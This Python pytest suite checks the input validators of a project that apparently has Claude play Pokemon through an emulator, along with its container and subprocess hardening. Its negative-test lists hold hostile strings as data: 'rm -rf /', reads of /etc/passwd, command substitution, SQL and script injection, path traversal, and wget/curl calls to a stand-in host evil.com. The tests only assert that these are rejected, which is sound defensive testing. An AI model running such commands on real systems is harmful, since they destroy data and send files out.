"""
Security Hardening Test Suite - Guardian Implementation

Comprehensive test suite to validate security measures implemented across
the claudelearnspokemon system, ensuring all critical vulnerabilities 
have been properly addressed.

Guardian Testing Principles:
- Test all security boundaries and validation points
- Include both positive and negative test cases
- Simulate real attack scenarios  
- Validate fail-secure behavior
- Comprehensive error handling verification

Author: Guardian Security Framework
"""

import pytest
import json
import tempfile
import subprocess
from unittest.mock import Mock, patch, MagicMock
from pathlib import Path

from claudelearnspokemon.validators import (
    ScriptValidator, 
    ButtonSequenceValidator,
    CheckpointDataValidator,
    LocationValidator,
    DockerImageValidator,
    CommandValidator,
    SecurityValidationError,
    InputSizeError,
    InputFormatError
)

class TestScriptValidator:
    """Test script input validation security measures."""
    
    def test_valid_script_passes(self):
        """Test that valid scripts pass validation."""
        valid_script = "PRESS A\nWAIT\nPRESS B\n# Comment\nMOVE UP"
        result = ScriptValidator.validate_script_text(valid_script)
        assert "PRESS A" in result
        assert "WAIT" in result
        
    def test_script_length_limit_enforced(self):
        """Test that oversized scripts are rejected."""
        oversized_script = "A" * 20000  # Exceeds MAX_SCRIPT_LENGTH
        with pytest.raises(InputSizeError, match="exceeds maximum"):
            ScriptValidator.validate_script_text(oversized_script)
            
    def test_empty_script_rejected(self):
        """Test that empty scripts are rejected."""
        with pytest.raises(InputFormatError, match="cannot be empty"):
            ScriptValidator.validate_script_text("")
        with pytest.raises(InputFormatError, match="cannot be empty"):
            ScriptValidator.validate_script_text("   \n  \n  ")
            
    def test_dangerous_patterns_detected(self):
        """Test that dangerous patterns are detected and blocked."""
        dangerous_scripts = [
            "PRESS A; rm -rf /",  # Shell injection
            "PRESS A && echo 'pwned'",  # Command chaining
            "PRESS A | cat /etc/passwd",  # Pipe injection
            "PRESS A `whoami`",  # Command substitution  
            "PRESS A $USER",  # Variable expansion
            "../../etc/passwd",  # Path traversal
            "<script>alert('xss')</script>",  # Script injection
            "eval('dangerous code')",  # Code evaluation
            "import os",  # Import statement
            "__import__('os')",  # Dunder method access
        ]
        
        for dangerous_script in dangerous_scripts:
            with pytest.raises(SecurityValidationError, match="dangerous pattern"):
                ScriptValidator.validate_script_text(dangerous_script)
                
    def test_disallowed_commands_rejected(self):
        """Test that commands not in whitelist are rejected."""
        disallowed_scripts = [
            "EXECUTE system('rm -rf /')",
            "IMPORT os",
            "EVAL malicious_code",
            "SHELL /bin/bash",
            "DELETE file.txt"
        ]
        
        for script in disallowed_scripts:
            with pytest.raises(SecurityValidationError, match="Disallowed command"):
                ScriptValidator.validate_script_text(script)

class TestButtonSequenceValidator:
    """Test button sequence validation security measures."""
    
    def test_valid_sequences_pass(self):
        """Test valid button sequences."""
        valid_sequences = [
            "A B START",
            "UP DOWN LEFT RIGHT",
            "A A B B SELECT START",
            "WAIT"
        ]
        
        for sequence in valid_sequences:
            result = ButtonSequenceValidator.validate_button_sequence(sequence)
            assert result == sequence
            
    def test_invalid_buttons_rejected(self):
        """Test that invalid button names are rejected."""
        invalid_sequences = [
            "A B HACK",
            "UP DOWN EXPLOIT",  
            "START '; rm -rf /'",
            "A && echo 'pwned'",
        ]
        
        for sequence in invalid_sequences:
            with pytest.raises(SecurityValidationError, match="Invalid button"):
                ButtonSequenceValidator.validate_button_sequence(sequence)
                
    def test_oversized_sequences_rejected(self):
        """Test that oversized sequences are rejected."""
        oversized = " ".join(["A"] * 500)  # Creates very long sequence
        with pytest.raises(InputSizeError, match="too long"):
            ButtonSequenceValidator.validate_button_sequence(oversized)

class TestCheckpointDataValidator:
    """Test checkpoint data validation security measures."""
    
    def test_valid_checkpoint_data_passes(self):
        """Test that valid checkpoint data passes validation."""
        valid_data = {
            "version": "1.0",
            "checkpoint_id": "550e8400-e29b-41d4-a716-446655440000",
            "game_state": {"location": "pallet_town", "health": 100},
            "metadata": {"created_at": "2024-01-01T00:00:00Z"}
        }
        
        result = CheckpointDataValidator.validate_checkpoint_data(valid_data)
        assert result["checkpoint_id"] == valid_data["checkpoint_id"]
        
    def test_missing_required_fields_rejected(self):
        """Test that missing required fields are rejected."""
        incomplete_data = {
            "version": "1.0",
            # Missing checkpoint_id, game_state, metadata
        }
        
        with pytest.raises(SecurityValidationError, match="Missing required fields"):
            CheckpointDataValidator.validate_checkpoint_data(incomplete_data)
            
    def test_invalid_checkpoint_id_rejected(self):
        """Test that invalid checkpoint IDs are rejected."""
        invalid_ids = [
            "",  # Empty
            "../../etc/passwd",  # Path traversal
            "'; DROP TABLE checkpoints; --",  # SQL injection
            "x" * 200,  # Too long
            "invalid-format-123",  # Wrong format
        ]
        
        for invalid_id in invalid_ids:
            data = {
                "version": "1.0", 
                "checkpoint_id": invalid_id,
                "game_state": {},
                "metadata": {}
            }
            with pytest.raises(SecurityValidationError):
                CheckpointDataValidator.validate_checkpoint_data(data)
                
    def test_deep_nesting_rejected(self):
        """Test that deeply nested JSON is rejected to prevent stack overflow."""
        # Create deeply nested structure
        nested = {}
        current = nested
        for i in range(20):  # Exceeds MAX_JSON_DEPTH
            current["nested"] = {}
            current = current["nested"]
            
        data = {
            "version": "1.0",
            "checkpoint_id": "550e8400-e29b-41d4-a716-446655440000", 
            "game_state": nested,
            "metadata": {}
        }
        
        with pytest.raises(SecurityValidationError, match="nesting too deep"):
            CheckpointDataValidator.validate_checkpoint_data(data)
            
    def test_compression_bomb_protection(self):
        """Test protection against compression bombs."""
        # Create oversized data
        oversized_data = b"A" * (100 * 1024 * 1024)  # 100MB
        
        with pytest.raises(InputSizeError, match="too large"):
            CheckpointDataValidator.validate_compressed_size(oversized_data)

class TestLocationValidator:
    """Test location string validation."""
    
    def test_valid_locations_pass(self):
        """Test valid location strings."""
        valid_locations = [
            "pallet_town",
            "cerulean_city", 
            "route_1",
            "Pokemon Center",
            "gym-battle-area"
        ]
        
        for location in valid_locations:
            result = LocationValidator.validate_location(location)
            assert result == location.strip()
            
    def test_path_traversal_rejected(self):
        """Test that path traversal attempts are rejected."""
        malicious_locations = [
            "../../../etc/passwd",
            "..\\windows\\system32",  
            "location/../secret",
            "/etc/passwd",
            "C:\\windows\\system32"
        ]
        
        for location in malicious_locations:
            with pytest.raises(SecurityValidationError, match="path traversal"):
                LocationValidator.validate_location(location)
                
    def test_oversized_location_rejected(self):
        """Test that oversized locations are rejected."""
        oversized = "x" * 1000
        with pytest.raises(InputSizeError, match="too long"):
            LocationValidator.validate_location(oversized)

class TestDockerImageValidator:
    """Test Docker image name validation."""
    
    def test_valid_images_pass(self):
        """Test valid Docker image names."""
        valid_images = [
            "pokemon-gym:latest",
            "docker.io/pokemon-gym:v1.0",
            "ghcr.io/user/pokemon-gym:stable"
        ]
        
        for image in valid_images:
            result = DockerImageValidator.validate_image_name(image)
            assert result == image
            
    def test_invalid_image_formats_rejected(self):
        """Test that invalid image formats are rejected."""
        invalid_images = [
            "",
            "pokemon-gym",  # Missing tag
            "pokemon-gym:latest; rm -rf /",  # Injection attempt
            "../../../evil:latest",  # Path traversal
            "pokemon-gym:latest && echo pwned",  # Command injection
        ]
        
        for image in invalid_images:
            with pytest.raises(SecurityValidationError):
                DockerImageValidator.validate_image_name(image)

class TestCommandValidator:
    """Test subprocess command validation."""
    
    def test_valid_commands_pass(self):
        """Test that whitelisted commands pass validation."""
        valid_commands = [
            ["claude", "chat", "--model", "claude-3-sonnet"],
            ["python3", "-c", "print('hello')"],
            ["python", "script.py"]
        ]
        
        for command in valid_commands:
            result = CommandValidator.validate_command(command)
            assert result[0] in CommandValidator.ALLOWED_EXECUTABLES
            
    def test_disallowed_executables_rejected(self):
        """Test that non-whitelisted executables are rejected."""
        dangerous_commands = [
            ["rm", "-rf", "/"],
            ["wget", "http://evil.com/malware"],
            ["curl", "-X", "POST", "http://evil.com"],
            ["bash", "-c", "rm -rf /"],
            ["sh", "malicious_script.sh"]
        ]
        
        for command in dangerous_commands:
            with pytest.raises(SecurityValidationError, match="not in whitelist"):
                CommandValidator.validate_command(command)
                
    def test_shell_metacharacters_rejected(self):
        """Test that shell metacharacters in arguments are rejected."""
        dangerous_args = [
            ["claude", "chat; rm -rf /"],
            ["python3", "-c", "print('hello') && rm file"],
            ["claude", "chat", "|", "curl", "evil.com"],
            ["python", "script.py", "`whoami`"],
            ["claude", "chat > /etc/passwd"]
        ]
        
        for command in dangerous_args:
            with pytest.raises(SecurityValidationError, match="Dangerous shell characters"):
                CommandValidator.validate_command(command)

class TestIntegrationSecurity:
    """Integration tests for security measures."""
    
    @patch('claudelearnspokemon.emulator_pool.docker')
    def test_emulator_pool_container_security(self, mock_docker):
        """Test that EmulatorPool creates secure containers."""
        from claudelearnspokemon.emulator_pool import EmulatorPool
        
        # Mock Docker client and container
        mock_client = Mock()
        mock_container = Mock()
        mock_container.id = "test-container-id"
        mock_client.containers.run.return_value = mock_container
        mock_docker.from_env.return_value = mock_client
        
        pool = EmulatorPool(pool_size=1, image_name="pokemon-gym:latest")
        pool.client = mock_client
        
        # Test secure container creation
        container = pool._start_single_container(8081)
        
        # Verify security configurations were applied
        call_args = mock_client.containers.run.call_args
        kwargs = call_args[1]
        
        # Check security options
        assert "user" in kwargs
        assert kwargs["user"] == "1000:1000"
        assert "security_opt" in kwargs  
        assert "no-new-privileges:true" in kwargs["security_opt"]
        assert "cap_drop" in kwargs
        assert kwargs["cap_drop"] == ["ALL"]
        assert "read_only" in kwargs
        assert kwargs["read_only"] is True
        
        # Check resource limits
        assert kwargs["mem_limit"] == "256m"
        assert kwargs["pids_limit"] == 100
        
    @patch('claudelearnspokemon.process_factory.subprocess.Popen')
    def test_process_factory_command_validation(self, mock_popen):
        """Test that ProcessFactory validates commands before execution."""
        from claudelearnspokemon.process_factory import ClaudeProcessFactory, ProcessConfig
        from claudelearnspokemon.prompts import ProcessType
        
        factory = ClaudeProcessFactory()
        config = ProcessConfig(
            process_type=ProcessType.SONNET_TACTICAL,
            model_name="claude-3-5-sonnet-20241022",
            system_prompt="Test prompt"
        )
        
        # Mock successful Popen creation
        mock_process = Mock()
        mock_process.pid = 12345
        mock_popen.return_value = mock_process
        
        # Test secure subprocess creation
        process = factory.create_subprocess(config)
        
        # Verify subprocess was created with security options
        call_args = mock_popen.call_args
        args, kwargs = call_args
        
        # Check security settings
        assert kwargs.get("shell") is False  # Never use shell=True
        assert kwargs.get("close_fds") is True
        assert kwargs.get("start_new_session") is True
        
        # Verify command was validated (should start with 'claude')
        command = args[0]
        assert command[0] == "claude"
        
    def test_checkpoint_manager_safe_deserialization(self):
        """Test that CheckpointManager safely handles malicious checkpoint data."""
        from claudelearnspokemon.checkpoint_manager import CheckpointManager, CheckpointCorruptionError
        
        with tempfile.TemporaryDirectory() as temp_dir:
            manager = CheckpointManager(storage_dir=temp_dir)
            
            # Test loading non-existent checkpoint
            with pytest.raises(Exception):  # Should raise CheckpointNotFoundError
                manager.load_checkpoint("nonexistent-id")
                
            # Create malformed checkpoint file
            checkpoint_path = Path(temp_dir) / "malicious.lz4"
            checkpoint_path.write_bytes(b"not-valid-lz4-data")
            
            # Test that malformed data is rejected
            with pytest.raises(Exception):  # Should raise CheckpointCorruptionError
                manager.load_checkpoint("malicious")

class TestSecurityConfiguration:
    """Test security configuration and settings."""
    
    def test_security_constants_properly_set(self):
        """Test that security constants are set to safe values."""
        from claudelearnspokemon.validators import (
            MAX_SCRIPT_LENGTH, 
            MAX_CHECKPOINT_SIZE_MB,
            MAX_JSON_DEPTH,
            MAX_LOCATION_LENGTH
        )
        
        # Verify limits are reasonable for security
        assert MAX_SCRIPT_LENGTH <= 50000  # Prevent resource exhaustion
        assert MAX_CHECKPOINT_SIZE_MB <= 100  # Prevent compression bombs  
        assert MAX_JSON_DEPTH <= 20  # Prevent stack overflow
        assert MAX_LOCATION_LENGTH <= 500  # Prevent oversized inputs
        
    def test_allowed_commands_minimal(self):
        """Test that command whitelists follow principle of least privilege."""
        # Script commands should be minimal DSL only
        assert len(ScriptValidator.ALLOWED_COMMANDS) < 20
        
        # System commands should be minimal trusted executables only
        assert len(CommandValidator.ALLOWED_EXECUTABLES) < 10
        assert 'claude' in CommandValidator.ALLOWED_EXECUTABLES
        
        # Button inputs should be game-specific only
        assert len(ButtonSequenceValidator.ALLOWED_BUTTON_INPUTS) < 15

if __name__ == "__main__":
    # Run security tests
    pytest.main([__file__, "-v", "--tb=short"])